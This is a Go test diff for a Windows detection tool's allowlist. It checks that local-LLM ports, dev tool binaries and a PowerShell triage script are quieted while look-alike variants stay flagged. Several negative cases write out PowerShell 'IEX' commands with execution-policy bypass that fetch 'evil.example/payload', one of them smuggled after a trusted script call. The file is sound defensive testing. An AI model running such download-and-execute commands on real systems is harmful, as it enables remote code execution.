@@ -557,3 +557,91 @@ func TestProductionAllowlistDriveRootAnchored(t *testing.T) {
 		})
 	}
 }
+
+// TestProductionSeedsQuietLocalLLMAndDevPaths pins the 2026-09-08 noise seeds
+// against the REAL config/allowlist.json: llama-server's fixed loopback ports
+// (:8001/:1234 — 44/46 NET-005 hits 09-03→09-08 were cursor/python polling
+// the local LLM API), the winget llama-server dev_tool_paths entry (NET-004),
+// the widened go-build temp-binary pattern (govulncheck), git's ls.exe in
+// trusted_binaries (EVADE-001 filename-argument FP: `ls` listing a directory
+// whose FILES are named amsi.dll/System.dll), and the pe-triage -Command
+// dev_scripts form. Each is asserted SCOPED: the armed controls must hold.
+func TestProductionSeedsQuietLocalLLMAndDevPaths(t *testing.T) {
+	_, file, _, ok := runtime.Caller(0)
+	if !ok {
+		t.Fatal("runtime.Caller failed")
+	}
+	dir := filepath.Dir(file)
+	var prodPath string
+	for i := 0; i < 6; i++ {
+		cand := filepath.Join(dir, "config", "allowlist.json")
+		if _, err := os.Stat(cand); err == nil {
+			prodPath = cand
+			break
+		}
+		dir = filepath.Dir(dir)
+	}
+	if prodPath == "" {
+		t.Skip("config/allowlist.json not found (running outside repo root)")
+	}
+	a, err := Load(prodPath)
+	if err != nil {
+		t.Fatalf("load production allowlist: %v", err)
+	}
+
+	// NET-005 seeds: fixed llama-server ports are quiet for any connector
+	// (bare host:port entries — the connectors rotate, the listener doesn't);
+	// an ephemeral loopback port must STAY ARMED (broker C2 shape).
+	if !a.DstIsKnownLoopback(`C:\Users\user01\AppData\Local\Programs\cursor\cursor.exe`, "127.0.0.1", 8001) {
+		t.Error("llama-server :8001 seed missing (cursor/python polling noise)")
+	}
+	if !a.DstIsKnownLoopback("", "127.0.0.1", 1234) {
+		t.Error("llama-server :1234 seed missing")
+	}
+	if a.DstIsKnownLoopback("", "127.0.0.1", 58172) {
+		t.Error("ephemeral loopback port must NOT be seeded (NET-005 stays armed)")
+	}
+
+	// NET-004 (and NET-002/003) dev_tool_paths seeds: winget llama-server and
+	// the go-build govulncheck temp binary; same-name binaries elsewhere must
+	// stay armed.
+	if !a.ImageInDevTools(`C:\Users\user01\AppData\Local\Microsoft\winget\Packages\ggml.llamacpp_microsoft.winget.source_8wekyb3d8bbwe\llama-server.exe`) {
+		t.Error("winget llama-server dev_tool_paths entry missing (NET-004 FP)")
+	}
+	if a.ImageInDevTools(`C:\Users\user01\Downloads\llama-server.exe`) {
+		t.Error("llama-server entry over-matches a Downloads binary")
+	}
+	if !a.ImageInDevTools(`C:\Users\user01\AppData\Local\Temp\go-build751320843\b001\exe\govulncheck.exe`) {
+		t.Error("go-build govulncheck.exe temp binary missing from dev_tool_paths")
+	}
+
+	// trusted_binaries: git's usr\bin\ls.exe (EVADE-001 filename-argument FP)
+	// joins the existing git group; a Downloads ls.exe must stay untrusted.
+	if !a.ImageTrusted(&event.Event{Image: `C:\Program Files\Git\usr\bin\ls.exe`}) {
+		t.Error("git ls.exe should be trusted (EVADE-001 listing FP, admin-tree git group)")
+	}
+	if a.ImageTrusted(&event.Event{Image: `C:\Users\user01\Downloads\ls.exe`}) {
+		t.Error("Downloads ls.exe must NOT be trusted")
+	}
+
+	// dev_scripts: the pe-triage -Command form (repo OUTPUT_DIR + relative
+	// script invocation, both required — F10 doctrine). Inert path mentions
+	// and a foreign OUTPUT_DIR must NOT match.
+	observed := `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command "$env:OUTPUT_DIR='C:\Users\jurij\Documents\Github\pe_triage\output\demo_pcode'; & '.\scripts\pe-triage-docker.ps1' -Mode docker"`
+	if !a.CmdLineInDevScripts(observed) {
+		t.Error("pe-triage -Command form should match dev_scripts (2 EXEC-001 hits 09-08)")
+	}
+	if a.CmdLineInDevScripts(`powershell -ep bypass -Command "IEX(gc C:\Users\ju\Documents\Github\pe_triage\scripts\pe-triage-docker.ps1)"`) {
+		t.Error("inert path mention must NOT match the -Command entry (F10)")
+	}
+	if a.CmdLineInDevScripts(`powershell -ep bypass -Command "$env:OUTPUT_DIR='C:\Users\ju\Documents\Github\pe_triage\output\x'; IEX(http://evil.example/payload)"`) {
+		t.Error("OUTPUT_DIR mention without the relative script invocation must NOT match")
+	}
+	// -Command context executes trailing '; <stmt>' (unlike -File tails, which
+	// are inert script args) — the entry is end-anchored so any statement
+	// separator after the script invocation re-arms EXEC-001 (F10/R4 class;
+	// flagged by the 2026-09-08 post-change review).
+	if a.CmdLineInDevScripts(`powershell -ExecutionPolicy Bypass -Command "$env:OUTPUT_DIR='C:\Users\ju\Documents\Github\pe_triage\output\demo_pcode'; & '.\scripts\pe-triage-docker.ps1'; IEX(http://evil.example/payload)"`) {
+		t.Error("trailing '; IEX(...)' must NOT match the -Command entry (executes in -Command context)")
+	}
+}
